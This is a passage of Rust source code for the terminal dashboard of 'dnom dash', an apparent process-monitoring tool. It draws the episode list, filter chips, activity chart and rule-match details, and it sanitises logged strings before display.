//! Drawing of `dnom dash`: header, filter chips, the episode list, the detail pane, the footer
//! and the help. Every string that comes out of the log is cut to its cell and stripped of
//! control characters first: command lines and paths are written by the monitored programs.

use ratatui::{
    Frame,
    buffer::Buffer,
    layout::Rect,
    style::{Color, Style},
    text::{Line, Span},
    widgets::{Block, BorderType, Clear, Widget},
};
use serde_json::Value;
use unicode_width::{UnicodeWidthChar, UnicodeWidthStr};

use super::{
    App, Focus, Hit, InputKind, Row,
    data::{Episode, KINDS, Since, Sort, tilde},
    theme::{self, LOGO_ROWS, LOGO_WIDTH, Theme},
};
use crate::{
    assess::Answer,
    audit::{self, Tag, What},
    driver::Kind,
    policy::Condition,
};

/// Below this the panes sit one behind the other instead of side by side.
const WIDE: u16 = 100;

pub(crate) fn draw(app: &mut App, frame: &mut Frame) {
    let area = frame.area();
    app.hits.clear();
    let mut cursor = None;
    let buf = frame.buffer_mut();
    if area.width < 44 || area.height < 9 {
        let line = Line::styled(clip("dnom dash needs a window of at least 44 × 9", area.width as usize), app.theme.dim());
        buf.set_line(area.x, area.y, &line, area.width);
        return;
    }

    let banner = app.banner && area.height >= 28 && area.width >= WIDE;
    let head_height = if banner { LOGO_ROWS as u16 + 1 } else { 1 };
    let head = Rect { height: head_height, ..area };
    let chips = Rect { y: area.y + head_height, height: 1, ..area };
    let body = Rect { y: chips.y + 1, height: area.height - head_height - 2, ..area };
    let foot = Rect { y: area.bottom() - 1, height: 1, ..area };

    if banner {
        header_banner(app, head, buf);
    } else {
        header_line(app, head, buf);
    }
    if app.store.len() == 0 {
        nothing_yet(app, Rect { y: chips.y, height: body.height + 1, ..area }, !banner, buf);
    } else {
        cursor = filter_row(app, chips, buf);
        app.wide = area.width >= WIDE;
        let detail_only = app.zoom || (!app.wide && app.focus == Focus::Detail);
        if detail_only && app.selected.is_some() {
            detail(app, body, buf);
        } else if app.wide {
            let left = (body.width * 42 / 100).clamp(46, 76);
            list(app, Rect { width: left, ..body }, buf);
            detail(app, Rect { x: body.x + left, width: body.width - left, ..body }, buf);
        } else {
            list(app, body, buf);
        }
    }
    footer(app, foot, buf);
    if app.help {
        help(app, area, buf);
    }
    if let Some(position) = cursor {
        frame.set_cursor_position(position);
    }
}

// --- text helpers ----------------------------------------------------------------------------

fn width(text: &str) -> usize {
    UnicodeWidthStr::width(text)
}

/// Text for one row of cells: control characters become spaces, and what does not fit in
/// `max` columns ends in an ellipsis.
fn clip(text: &str, max: usize) -> String {
    let mut out = String::new();
    let mut used = 0;
    for c in text.chars() {
        let c = if c.is_control() { ' ' } else { c };
        let w = UnicodeWidthChar::width(c).unwrap_or(0);
        if used + w > max {
            while used + 1 > max
                && let Some(last) = out.pop()
            {
                used -= UnicodeWidthChar::width(last).unwrap_or(0);
            }
            if max > 0 {
                out.push('…');
            }
            return out;
        }
        out.push(c);
        used += w;
    }
    out
}

/// Like `clip`, but keeps the end: for paths, where the last part says most.
fn clip_start(text: &str, max: usize) -> String {
    if width(text) <= max {
        return clip(text, max);
    }
    let reversed: String = text.chars().rev().collect();
    let kept: String = clip(&reversed, max).chars().rev().collect();
    kept
}

fn pad(text: &str, to: usize) -> String {
    format!("{text}{}", " ".repeat(to.saturating_sub(width(text))))
}

fn thousands(n: u64) -> String {
    let digits = n.to_string();
    let mut out = String::new();
    for (i, c) in digits.chars().enumerate() {
        if i > 0 && (digits.len() - i).is_multiple_of(3) {
            out.push(',');
        }
        out.push(c);
    }
    out
}

/// A count in few characters: 950, 12.4k, 2.3M.
fn short_count(n: u64) -> String {
    match n {
        0..=999 => n.to_string(),
        1_000..=999_999 => format!("{:.1}k", n as f64 / 1e3),
        _ => format!("{:.1}M", n as f64 / 1e6),
    }
}

fn ago(ms: u64) -> String {
    match ms / 1000 {
        s if s < 90 => format!("{s} s ago"),
        s if s < 5400 => format!("{} min ago", s / 60),
        s if s < 172_800 => format!("{} h ago", s / 3600),
        s => format!("{} d ago", s / 86_400),
    }
}

fn local_tm(ms: u64) -> libc::tm {
    let secs = (ms / 1000) as libc::time_t;
    let mut tm: libc::tm = unsafe { std::mem::zeroed() };
    unsafe { libc::localtime_r(&secs, &mut tm) };
    tm
}

/// The day of a time as a list heading: `Today · Sat 14 Nov`.
pub(crate) fn day_label(ms: u64, now_ms: u64) -> String {
    const DAYS: [&str; 7] = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
    const MONTHS: [&str; 12] = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
    let (tm, now) = (local_tm(ms), local_tm(now_ms));
    let date = format!("{} {} {}", DAYS[tm.tm_wday.rem_euclid(7) as usize], tm.tm_mday, MONTHS[tm.tm_mon.rem_euclid(12) as usize]);
    let yesterday = local_tm(now_ms.saturating_sub(86_400_000));
    let same = |a: &libc::tm, b: &libc::tm| a.tm_year == b.tm_year && a.tm_yday == b.tm_yday;
    if same(&tm, &now) {
        format!("Today · {date}")
    } else if same(&tm, &yesterday) {
        format!("Yesterday · {date}")
    } else {
        date
    }
}

fn clock(ms: u64) -> String {
    audit::local(Some(ms), "%H:%M:%S")
}

/// A space that `wrap` does not break at.
const NBSP: char = '\u{a0}';

/// Breaks a line into rows of at most `width` columns, at a space where one is near. Rows
/// after the first start `hang` columns in, so a wrapped command stays under its own start.
fn wrap(line: Line<'static>, width: usize, hang: usize) -> Vec<Line<'static>> {
    let width = width.max(8);
    // A deep indent in a narrow pane would leave a few columns per row.
    let hang = if hang > width / 2 { 4.min(width / 2) } else { hang };
    let cells: Vec<(char, Style)> = line
        .spans
        .iter()
        .flat_map(|span| span.content.chars().map(move |c| (if c.is_control() { ' ' } else { c }, span.style)))
        .collect();
    let cell_width = |c: char| UnicodeWidthChar::width(c).unwrap_or(0);
    let mut rows = Vec::new();
    let mut start = 0;
    while start < cells.len() || rows.is_empty() {
        let room = if rows.is_empty() { width } else { width - hang };
        let (mut end, mut used) = (start, 0);
        while end < cells.len() && used + cell_width(cells[end].0) <= room {
            used += cell_width(cells[end].0);
            end += 1;
        }
        if end < cells.len() {
            // Break after the last space in the second half of the row, if there is one.
            if let Some(space) = (start + (end - start) / 2..end).rev().find(|i| cells[*i].0 == ' ') {
                end = space + 1;
            }
        }
        let end = end.max(start + 1).min(cells.len());
        let mut spans: Vec<Span<'static>> = Vec::new();
        if !rows.is_empty() && hang > 0 {
            spans.push(Span::raw(" ".repeat(hang)));
        }
        let mut run = String::new();
        let mut run_style = Style::new();
        for &(c, style) in &cells[start..end] {
            if style != run_style && !run.is_empty() {
                spans.push(Span::styled(std::mem::take(&mut run), run_style));
            }
            run_style = style;
            // A no-break space held two words together; on screen it is a space.
            run.push(if c == NBSP { ' ' } else { c });
        }
        if !run.is_empty() {
            spans.push(Span::styled(run, run_style));
        }
        rows.push(Line::from(spans));
        start = end;
        // A row never starts with the spaces it was broken at.
        while !rows.is_empty() && start < cells.len() && cells[start].0 == ' ' && start > 0 {
            start += 1;
        }
        if cells.is_empty() {
            break;
        }
    }
    rows
}

/// Draws a line cut to the area's width.
fn put(buf: &mut Buffer, area: Rect, row: u16, line: &Line) {
    if row < area.height {
        buf.set_line(area.x, area.y + row, line, area.width);
    }
}

fn line_width(line: &Line) -> usize {
    line.spans.iter().map(|s| width(&s.content)).sum()
}

/// Draws a line so that it ends at the area's right edge.
fn put_right(buf: &mut Buffer, area: Rect, row: u16, line: &Line) {
    let w = (line_width(line) as u16).min(area.width);
    if row < area.height {
        buf.set_line(area.right() - w, area.y + row, line, w);
    }
}

// --- header ----------------------------------------------------------------------------------

/// What the log is doing, as a dot and a few words.
fn status(app: &App) -> Vec<Span<'static>> {
    let t = app.theme;
    if let Some(error) = &app.feed.error {
        return vec![Span::styled("✕ ", t.threat()), Span::styled(format!("cannot read the log: {error}"), t.threat())];
    }
    if !app.feed.exists {
        return vec![Span::styled("○ ", t.warn()), Span::raw("no log yet")];
    }
    let Some(last) = app.store.last_ms else {
        return vec![Span::styled("○ ", t.dim()), Span::raw("watching · the log is empty")];
    };
    let age = app.now_ms.saturating_sub(last);
    let dot = if age < 300_000 { t.good() } else { t.dim() };
    vec![Span::styled("● ", dot), Span::raw("watching"), Span::styled(format!(" · last episode {}", ago(age)), t.dim())]
}

/// Episodes, matched rules and running episodes in the whole log.
fn totals(app: &App) -> Vec<Span<'static>> {
    let t = app.theme;
    let flagged = app.store.all().filter(|e| e.flagged()).count();
    let running = app.store.all().filter(|e| !e.alive.is_empty()).count();
    let mut spans = vec![Span::styled(thousands(app.store.len() as u64), t.bold()), Span::raw(if app.store.len() == 1 { " episode" } else { " episodes" })];
    spans.push(Span::styled(" · ", t.dim()));
    spans.push(Span::styled(format!("{flagged} flagged"), if flagged > 0 { t.threat() } else { t.dim() }));
    if running > 0 {
        spans.push(Span::styled(" · ", t.dim()));
        spans.push(Span::styled(format!("{running} running"), t.good()));
    }
    if app.store.dropped > 0 {
        spans.push(Span::styled(format!(" · {} older not loaded", thousands(app.store.dropped)), t.dim()));
    }
    spans
}

/// The folder the log is in.
fn source(app: &App) -> String {
    tilde(app.feed.path.parent().unwrap_or(&app.feed.path))
}

fn header_line(app: &App, area: Rect, buf: &mut Buffer) {
    let t = app.theme;
    let mut spans = vec![Span::raw(" ")];
    spans.extend(theme::helix_inline(t, app.turn(), 3));
    spans.push(Span::styled(" dnom", t.gradient(0.5)));
    spans.push(Span::styled("  │  ", t.dim()));
    spans.extend(status(app));
    spans.push(Span::styled("  │  ", t.dim()));
    spans.extend(totals(app));
    let left = Line::from(spans);
    put(buf, area, 0, &left);
    let room = (area.width as usize).saturating_sub(line_width(&left) + 3);
    if room >= 12 {
        let source = Line::styled(format!("{} ", clip_start(&source(app), room)), t.dim());
        put_right(buf, area, 0, &source);
    }
}

fn header_banner(app: &App, area: Rect, buf: &mut Buffer) {
    let t = app.theme;
    for (row, line) in theme::logo(t, app.turn()).iter().enumerate() {
        buf.set_line(area.x + 2, area.y + row as u16, line, area.width.saturating_sub(2));
    }
    let info_x = area.x + 2 + LOGO_WIDTH + 4;
    let rest = area.right().saturating_sub(info_x);
    // The chart gets what is left once the facts have their room.
    let chart_width = if rest >= 58 + 26 { (rest - 60).min(72) } else { 0 };
    let info = Rect { x: info_x, width: rest - chart_width - if chart_width > 0 { 2 } else { 0 }, height: LOGO_ROWS as u16, ..area };

    let label = |name: &str| Span::styled(format!("{name:<10}"), t.dim());
    let room = (info.width as usize).saturating_sub(10);
    let mut model = vec![label("model")];
    if app.store.model_calls == 0 {
        model.push(Span::styled("not asked (rules without a model)", t.dim()));
    } else {
        model.push(Span::raw(clip(&app.store.model, room)));
        // As many of the numbers as fit whole; a number cut in half reads as another number.
        let mut used = width(&app.store.model);
        let latency = app.store.median_latency_ms().map(|ms| format!(" · {ms} ms"));
        let parts = [Some(format!(" · {} answers", thousands(app.store.model_calls))), Some(format!(" · {} tokens", short_count(app.store.tokens))), latency];
        for part in parts.into_iter().flatten() {
            if used + width(&part) > room {
                break;
            }
            used += width(&part);
            model.push(Span::styled(part, t.dim()));
        }
    }
    let lines = [
        Line::from(vec![label("source"), Span::raw(clip_start(&source(app), room))]),
        Line::from([vec![label("status")], status(app)].concat()),
        Line::from([vec![label("log")], totals(app)].concat()),
        Line::from(model),
        Line::from(vec![label("mode"), Span::raw("observe-only"), Span::styled(clip(" · rules are a dry run", room.saturating_sub(12)), t.dim())]),
    ];
    for (row, line) in lines.iter().enumerate() {
        put(buf, info, row as u16, line);
    }
    if chart_width > 0 {
        chart(app, Rect { x: area.right() - chart_width - 1, width: chart_width, height: LOGO_ROWS as u16, ..area }, buf);
    }
}

/// Assessments over time: one column per slice, three rows tall, red where a rule matched.
fn chart(app: &App, area: Rect, buf: &mut Buffer) {
    let t = app.theme;
    let (Some(first), Some(last)) = (app.store.first_ms, app.store.last_ms) else { return };
    // A log that is being written ends now; a finished one ends at its last record.
    let live = app.now_ms.saturating_sub(last) < 600_000;
    let to = if live { app.now_ms } else { last };
    let from = first.max(to.saturating_sub(86_400_000)).min(to.saturating_sub(600_000));
    let slices = app.store.chart(from, to, area.width as usize);
    // At least 6 to the top: one assessment in a quiet log is a low bar, not a peak.
    let peak = slices.iter().map(|(n, _)| *n).max().unwrap_or(0).max(6) as f64;

    let hours = (to - from) as f64 / 3_600_000.0;
    let span = if hours >= 23.5 { "24 h".to_string() } else if hours >= 1.0 { format!("{hours:.0} h") } else { format!("{:.0} min", hours * 60.0) };
    let shown: u32 = slices.iter().map(|(n, _)| *n).sum();
    put(buf, area, 0, &Line::from(vec![Span::styled("activity", t.bold()), Span::styled(format!(" · {span}"), t.dim())]));
    put_right(buf, area, 0, &Line::styled(format!("{} assessment{}", thousands(shown as u64), if shown == 1 { "" } else { "s" }), t.dim()));

    const BLOCKS: [&str; 9] = [" ", "▁", "▂", "▃", "▄", "▅", "▆", "▇", "█"];
    for (x, (count, flagged)) in slices.iter().enumerate() {
        // Square root: a burst does not flatten the quiet hours next to it.
        let eighths = if *count == 0 { 0 } else { (((*count as f64 / peak).sqrt() * 24.0).ceil() as usize).clamp(1, 24) };
        for row in 0..3usize {
            let level = eighths.saturating_sub((2 - row) * 8).min(8);
            let style = if *flagged { t.threat() } else { t.accent() };
            let glyph = if level == 0 && row == 2 { ("·", t.dim()) } else { (BLOCKS[level], style) };
            if let Some(cell) = buf.cell_mut((area.x + x as u16, area.y + 1 + row as u16)) {
                cell.set_symbol(glyph.0).set_style(glyph.1);
            }
        }
    }
    let same_day = local_tm(from).tm_yday == local_tm(to).tm_yday;
    let start = audit::local(Some(from), if same_day { "%H:%M" } else { "%m-%d %H:%M" });
    put(buf, area, 4, &Line::styled(start, t.dim()));
    put_right(buf, area, 4, &Line::styled(if live { "now".to_string() } else { audit::local(Some(to), "%m-%d %H:%M") }, t.dim()));
}

// --- filters ---------------------------------------------------------------------------------

struct Chip {
    hit: Hit,
    key: &'static str,
    label: String,
    count: Option<usize>,
    /// Its colour when it is on.
    on: Option<Color>,
    /// Another chip of its group is on and this one is not.
    faded: bool,
    /// Starts a new group: a divider goes before it.
    divider: bool,
    /// Only a hint for a key: left out first when the row is too narrow.
    hint: bool,
}

fn chips(app: &App) -> Vec<Chip> {
    let t = app.theme;
    let f = &app.filters;
    let any_who = f.who.contains(&true);
    let mut chips = vec![Chip {
        hit: Hit::Flagged,
        key: "f",
        label: "flagged".into(),
        count: Some(app.facets.flagged),
        on: f.flagged.then_some(Color::Red),
        faded: false,
        divider: false,
        hint: false,
    }];
    for (i, kind) in KINDS.iter().enumerate() {
        chips.push(Chip {
            hit: Hit::Who(i),
            key: ["1", "2", "3", "4", "5"][i],
            label: kind.name().into(),
            count: Some(app.facets.by_kind[i]),
            on: f.who[i].then_some(t.driver_chip(*kind)),
            faded: any_who && !f.who[i],
            divider: i == 0,
            hint: false,
        });
    }
    let plain = |hit, key, label: String, on: bool, divider: bool, hint: bool| Chip { hit, key, label, count: None, on: on.then_some(Color::Cyan), faded: false, divider, hint };
    chips.push(plain(Hit::Since, "t", f.since.label().into(), f.since != Since::All, true, false));
    chips.push(plain(Hit::Sort, "s", app.sort.label().into(), app.sort != Sort::Newest, false, false));
    let searching = !f.search.trim().is_empty();
    chips.push(plain(Hit::Search, "/", if searching { format!("“{}”", clip(f.search.trim(), 24)) } else { "search".into() }, searching, true, !searching));
    let condition = f.condition.as_ref().map(|(text, _)| clip(text, 36));
    chips.push(plain(Hit::Where, "w", condition.clone().unwrap_or_else(|| "where".into()), condition.is_some(), false, condition.is_none()));
    chips
}

/// The chips as spans, each with what a click on it does. The narrower the row, the higher
/// `terse`: 1 leaves out the chips that only name a key, 2 the counts as well, 3 also the
/// chips that are at their default.
fn chip_spans(t: Theme, chips: &[Chip], terse: usize) -> Vec<(Vec<Span<'static>>, Option<Hit>)> {
    let mut out = Vec::new();
    let mut divider = false;
    for chip in chips {
        divider |= chip.divider;
        let at_default = chip.on.is_none() && matches!(chip.hit, Hit::Since | Hit::Sort);
        if (chip.hint && terse >= 1) || (at_default && terse >= 3) {
            continue;
        }
        if std::mem::take(&mut divider) {
            out.push((vec![Span::styled("│", t.dim())], None));
        }
        let label = if terse >= 3 && chip.label == "automation" { "auto".to_string() } else { chip.label.clone() };
        let count = chip.count.filter(|_| terse < 2).map(|n| format!(" {n}")).unwrap_or_default();
        let spans = match chip.on {
            Some(color) => vec![Span::styled(format!(" {} {label}{count} ", chip.key), t.chip_on(color))],
            None => {
                let text = if chip.faded { t.dim() } else { t.text() };
                vec![Span::raw(" "), Span::styled(chip.key, t.key()), Span::styled(format!(" {label}"), text), Span::styled(format!("{count} "), t.dim())]
            }
        };
        out.push((spans, Some(chip.hit)));
    }
    out
}

/// The row under the header: the filter chips, or the line being typed. Returns where the
/// text cursor goes while typing.
fn filter_row(app: &mut App, area: Rect, buf: &mut Buffer) -> Option<(u16, u16)> {
    let t = app.theme;
    let shown = format!("{} of {} ", thousands(app.view.len() as u64), thousands(app.store.len() as u64));
    if let Some(input) = &app.input {
        let (key, name) = match input.kind {
            InputKind::Search => ("/", "search"),
            InputKind::Where => ("w", "where"),
        };
        let lead = vec![Span::raw(" "), Span::styled(key, t.key()), Span::styled(format!(" {name}  "), t.bold())];
        let lead_width: usize = lead.iter().map(|s| width(&s.content)).sum();
        let note = match &input.error {
            Some(error) => Line::styled(format!(" {} ", clip(error, area.width as usize / 2)), t.threat()),
            None => Line::styled(format!(" {shown}· ⏎ keep · esc cancel "), t.dim()),
        };
        let room = (area.width as usize).saturating_sub(lead_width + line_width(&note) + 1);
        // Keep the cursor in sight when the text is longer than its room.
        let chars: Vec<char> = input.text.chars().collect();
        let skip = input.cursor.saturating_sub(room.saturating_sub(1));
        let visible: String = chars.iter().skip(skip).take(room).collect();
        let mut spans = lead;
        spans.push(Span::raw(visible));
        put(buf, area, 0, &Line::from(spans));
        put_right(buf, area, 0, &note);
        let before: String = chars.iter().skip(skip).take(input.cursor - skip).collect();
        return Some((area.x + (lead_width + width(&before)) as u16, area.y));
    }

    let all = chips(app);
    let clear = if app.filters.active() > 0 { vec![Span::styled("x", t.key()), Span::styled(" clear  ", t.text())] } else { Vec::new() };
    let right_width = clear.iter().map(|s| width(&s.content)).sum::<usize>() + width(&shown);
    // The most detailed version that fits.
    let fitted = (0..=3)
        .map(|terse| chip_spans(t, &all, terse))
        .find(|spans| spans.iter().map(|(s, _)| s.iter().map(|x| width(&x.content)).sum::<usize>()).sum::<usize>() + right_width < area.width as usize)
        .unwrap_or_else(|| chip_spans(t, &all, 3));
    let mut x = area.x;
    for (spans, hit) in fitted {
        let w = spans.iter().map(|s| width(&s.content)).sum::<usize>() as u16;
        if x + w > area.right() {
            break;
        }
        buf.set_line(x, area.y, &Line::from(spans), w);
        if let Some(hit) = hit {
            app.hits.push((Rect { x, y: area.y, width: w, height: 1 }, hit));
        }
        x += w;
    }
    let right = Line::from([clear, vec![Span::styled(shown, t.dim())]].concat());
    if x + right_width as u16 <= area.right() {
        put_right(buf, area, 0, &right);
        if app.filters.active() > 0 {
            app.hits.push((Rect { x: area.right() - right_width as u16, y: area.y, width: 7, height: 1 }, Hit::Clear));
        }
    }
    None
}

// --- list ------------------------------------------------------------------------------------

fn pane<'a>(t: Theme, focused: bool, title: Vec<Span<'a>>) -> Block<'a> {
    Block::bordered().border_type(BorderType::Rounded).border_style(t.border(focused)).title(Line::from(title))
}

fn short_kind(kind: Kind) -> &'static str {
    match kind {
        Kind::Automation => "auto",
        other => other.name(),
    }
}

/// What to say about an episode at the right end of its row, and whether it is loud: a
/// matched rule (red) or a model that says act (yellow) get a dot in front as well. The rest
/// stays grey, so the few loud rows are the ones the eye lands on.
fn badge(app: &App, ep: &Episode, dim: Style) -> Option<(String, Style, bool)> {
    let t = app.theme;
    if let Some(first) = ep.rules.first() {
        let more = if ep.rules.len() > 1 { format!(" +{}", ep.rules.len() - 1) } else { String::new() };
        return Some((format!("{first}{more}"), t.threat(), true));
    }
    match ep.response.as_deref() {
        Some(pick @ ("alert" | "contain")) => return Some((format!("model: {pick}"), t.warn(), true)),
        Some("watch") => return Some(("watch".into(), dim, false)),
        _ => {}
    }
    // By risk, each row shows the answer that put it where it is.
    let (id, p) = ep.top.as_ref().filter(|_| app.sort == Sort::Risk)?;
    let label = app.store.assessment.questions.iter().find(|q| q.id == *id).map_or(id.as_str(), |q| q.label());
    Some((format!("{label} {p:.2}"), dim, false))
}

/// A command line for the list: programs by name instead of by path, so the row starts with
/// what ran (`claude --resume …`, `bash backup.sh`) and not with where it is installed.
fn brief(command: &str) -> String {
    const RUNNERS: [&str; 12] = ["bash", "sh", "zsh", "dash", "fish", "env", "python", "python3", "node", "perl", "ruby", "sudo"];
    let name = |word: &str| word.rsplit('/').next().unwrap_or(word).to_string();
    let mut words = command.splitn(3, ' ');
    let first = words.next().unwrap_or("");
    let program = name(first);
    let mut out = vec![program.clone()];
    if let Some(second) = words.next() {
        let script = RUNNERS.contains(&program.as_str()) && second.contains('/') && !second.starts_with('-');
        out.push(if script { name(second) } else { second.to_string() });
    }
    out.extend(words.map(String::from));
    out.join(" ")
}

fn episode_row(app: &App, ep: &Episode, columns: usize, selected: bool) -> Line<'static> {
    let t = app.theme;
    let dim = if selected { t.dim_on_selected() } else { t.dim() };
    let badge = badge(app, ep, dim);
    let loud = badge.as_ref().filter(|(_, _, loud)| *loud).map(|(_, style, _)| *style);
    let running = !ep.alive.is_empty();
    let mark_style = loud.unwrap_or(if running { t.good() } else { dim });
    let mark = match (running, loud.is_some()) {
        (true, _) if app.still => "▶",
        (true, _) => theme::spinner(app.frame),
        (false, true) => "●",
        (false, false) => "·",
    };
    let time = if app.sort == Sort::Risk { audit::local(Some(ep.at_ms), "%m-%d %H:%M") } else { clock(ep.at_ms) };
    let who_style = if ep.driver.kind == Kind::Automation { dim } else { t.driver(ep.driver.kind) };
    let mut spans = vec![
        if selected { Span::styled("▌", t.accent()) } else { Span::raw(" ") },
        Span::styled(mark, mark_style),
        Span::raw(" "),
        Span::styled(time.clone(), dim),
        Span::raw(" "),
        Span::styled(pad(short_kind(ep.driver.kind), 8), who_style),
    ];
    let rest = columns.saturating_sub(3 + width(&time) + 1 + 8 + 1);
    let badge = badge.map(|(text, style, _)| (clip(&text, (rest * 2 / 5).clamp(8, 34).min(rest)), style));
    let badge_width = badge.as_ref().map_or(0, |(text, _)| width(text) + 2);
    let command = clip(&brief(&ep.command), rest.saturating_sub(badge_width));
    spans.push(Span::styled(pad(&command, rest.saturating_sub(badge_width)), if ep.flagged() { t.bold() } else { t.text() }));
    if let Some((text, style)) = badge {
        spans.push(Span::raw("  "));
        spans.push(Span::styled(text, style));
    }
    Line::from(spans)
}

fn list(app: &mut App, area: Rect, buf: &mut Buffer) {
    let t = app.theme;
    let focused = app.focus == Focus::List && app.input.is_none();
    let mut block = pane(t, focused, vec![Span::styled(" Episodes ", if focused { t.key() } else { t.bold() })]);
    if !app.follow && app.unseen > 0 {
        block = block.title_bottom(Line::from(vec![Span::styled(format!(" ↑ {} new ", app.unseen), t.good()), Span::styled("g", t.key()), Span::raw(" ")]));
    }
    if let Some(index) = app.selected_index() {
        block = block.title_bottom(Line::styled(format!(" {} / {} ", index + 1, app.view.len()), t.dim()).right_aligned());
    }
    let inner = block.inner(area);
    block.render(area, buf);
    app.hits.push((area, Hit::List));
    app.list_height = inner.height as usize;
    if inner.width < 20 || inner.height == 0 {
        return;
    }
    if app.rows.is_empty() {
        let lines = [
            Line::styled("Nothing matches these filters.", t.text()),
            Line::from(vec![Span::styled("x", t.key()), Span::styled(" clears them", t.dim())]),
        ];
        for (i, line) in lines.iter().enumerate() {
            put(buf, Rect { x: inner.x + 2, width: inner.width - 2, ..inner }, 1 + i as u16, line);
        }
        return;
    }

    // Keep the selected row in sight, with a row of context above and below where possible.
    let at = app.selected.and_then(|key| app.rows.iter().position(|r| *r == Row::Episode(key))).unwrap_or(0);
    let height = inner.height as usize;
    let margin = usize::from(height > 4);
    let mut top = app.list_top.min(app.rows.len().saturating_sub(height));
    if at < top + margin {
        top = at.saturating_sub(margin);
    }
    if at + margin >= top + height {
        top = at + margin + 1 - height;
    }
    // The first episode's day heading comes into view with it.
    if at <= 1 {
        top = 0;
    }
    app.list_top = top;

    for (row, entry) in app.rows.iter().enumerate().skip(top).take(height) {
        let y = inner.y + (row - top) as u16;
        match entry {
            Row::Day(day) => {
                let text = format!(" ── {day} ");
                let fill = "─".repeat((inner.width as usize).saturating_sub(width(&text) + 1));
                buf.set_line(inner.x, y, &Line::styled(format!("{text}{fill}"), t.dim()), inner.width);
            }
            Row::Episode(key) => {
                let Some(ep) = app.store.get(*key) else { continue };
                let selected = app.selected == Some(*key);
                let line = episode_row(app, ep, inner.width as usize, selected);
                let row_area = Rect { x: inner.x, y, width: inner.width, height: 1 };
                buf.set_line(inner.x, y, &line, inner.width);
                if selected {
                    buf.set_style(row_area, t.selected());
                }
                app.hits.push((row_area, Hit::Episode(*key)));
            }
        }
    }
    scrollbar(t, buf, area, top, height, app.rows.len());
}

/// A thumb on the pane's right border when there is more than fits.
fn scrollbar(t: Theme, buf: &mut Buffer, pane: Rect, top: usize, height: usize, total: usize) {
    if total <= height || height == 0 {
        return;
    }
    let size = (height * height / total).max(1);
    let offset = (top * (height - size) + (total - height) / 2) / (total - height);
    for i in 0..size {
        if let Some(cell) = buf.cell_mut((pane.right() - 1, pane.y + 1 + (offset + i) as u16)) {
            cell.set_symbol("┃").set_style(t.accent());
        }
    }
}

// --- detail ----------------------------------------------------------------------------------

/// The lines of the detail pane, wrapped to its width as they are added.
struct Doc {
    lines: Vec<Line<'static>>,
    width: usize,
}

impl Doc {
    fn add(&mut self, spans: Vec<Span<'static>>, hang: usize) {
        self.lines.extend(wrap(Line::from(spans), self.width, hang));
    }

    fn blank(&mut self) {
        self.lines.push(Line::default());
    }

    /// A heading with a rule to the right edge.
    fn section(&mut self, t: Theme, title: &str, note: String) {
        self.blank();
        let note = clip(&note, self.width.saturating_sub(width(title) + 6));
        let used = width(title) + if note.is_empty() { 0 } else { width(&note) + 2 };
        let mut spans = vec![Span::styled(title.to_string(), t.heading())];
        if !note.is_empty() {
            spans.push(Span::styled(format!("  {note}"), t.dim()));
        }
        spans.push(Span::styled(format!(" {}", "─".repeat(self.width.saturating_sub(used + 1))), t.dim()));
        self.lines.push(Line::from(spans));
    }
}

fn response_style(t: Theme, pick: &str) -> Style {
    match pick {
        "ignore" => t.good(),
        "watch" | "alert" | "contain" => t.warn(),
        _ => t.text(),
    }
}

fn tag_span(t: Theme, tag: &Tag) -> Span<'static> {
    match tag {
        Tag::Decoy => Span::styled("DECOY", t.threat()),
        Tag::DnomConfig => Span::styled("DNOM CONFIG", t.threat()),
        Tag::Category(category) if category == "temp" => Span::styled(category.clone(), t.dim()),
        Tag::Category(category) => Span::styled(category.replace('_', " "), t.warn()),
        Tag::NewDestination => Span::styled("new destination", t.warn()),
    }
}

/// How much a process stands out, from the steps it took: 2 a decoy or dnom's own files,
/// 1 a sensitive file or a new destination.
fn weight(step: &Value) -> u8 {
    match audit::step_parts(step).1 {
        Some(Tag::Decoy | Tag::DnomConfig) => 2,
        Some(Tag::Category(category)) if category == "temp" => 0,
        Some(Tag::Category(_) | Tag::NewDestination) => 1,
        None => 0,
    }
}

fn readable(app: &App, ep: &Episode, doc: &mut Doc) {
    let t = app.theme;
    let record = &ep.record;
    let e = ep.ep();
    let policy: Vec<&Value> = record["policy"].as_array().into_iter().flatten().collect();

    // What ran, and when.
    doc.add(vec![Span::styled(ep.command.clone(), t.bold())], 0);
    let (start, end) = (audit::rfc3339_ms(&e["window"]["start"]), audit::rfc3339_ms(&e["window"]["end"]));
    let mut meta = vec![Span::styled(ep.id.clone(), t.dim())];
    if let (Some(s), Some(end)) = (start, end) {
        meta.push(Span::styled(format!(" · {} {} → {} · {}", day_label(s, app.now_ms), clock(s), clock(end), audit::span(end.saturating_sub(s))), t.dim()));
    }
    doc.add(meta, 0);
    doc.blank();

    // The verdict.
    if policy.is_empty() {
        doc.add(vec![Span::styled("● ", t.good()), Span::raw("no rule matched")], 2);
    } else {
        let n = policy.len();
        doc.add(
            vec![
                Span::styled(format!("▲ THREAT · {n} rule{} matched", if n == 1 { "" } else { "s" }), t.threat()),
                Span::styled(" · dry run, nothing was stopped", t.dim()),
            ],
            2,
        );
        let name_width = policy.iter().filter_map(|p| p["rule"].as_str()).map(width).max().unwrap_or(0);
        for p in &policy {
            let actions: Vec<&str> = p["actions"].as_array().into_iter().flatten().filter_map(|a| a.as_str()).collect();
            let values: Vec<String> = p["values"].as_object().into_iter().flatten().map(|(k, v)| format!("{k}={}", v.as_str().map_or(v.to_string(), String::from))).collect();
            let mut spans = vec![
                Span::raw("  "),
                Span::styled(pad(p["rule"].as_str().unwrap_or("?"), name_width), t.threat()),
                Span::styled("  would ", t.dim()),
                Span::raw(actions.join(", ")),
            ];
            if p["protected"] == true {
                spans.push(Span::styled(" (protected program: alert only)", t.dim()));
            }
            doc.add(spans, 4);
            // The values the condition saw, on their own row.
            doc.add(vec![Span::styled(format!("    {}", values.join("  ")), t.dim())], 4);
        }
    }
    doc.blank();

    // Who and where.
    let label = |name: &str| Span::styled(format!("{name:<9}"), t.dim());
    let mut who = vec![label("who"), Span::styled(ep.driver.kind.name(), t.driver(ep.driver.kind).patch(t.bold()))];
    if !ep.driver.by.is_empty() {
        who.push(Span::styled(format!(" · {}", ep.driver.by), t.dim()));
    }
    doc.add(who, 9);
    let started_by = e["root"]["started_by"].as_str().filter(|s| !s.is_empty()).map(|s| format!(" · started by {s}")).unwrap_or_default();
    let uid = e["root"]["uid"].as_u64().map_or("?".to_string(), |u| u.to_string());
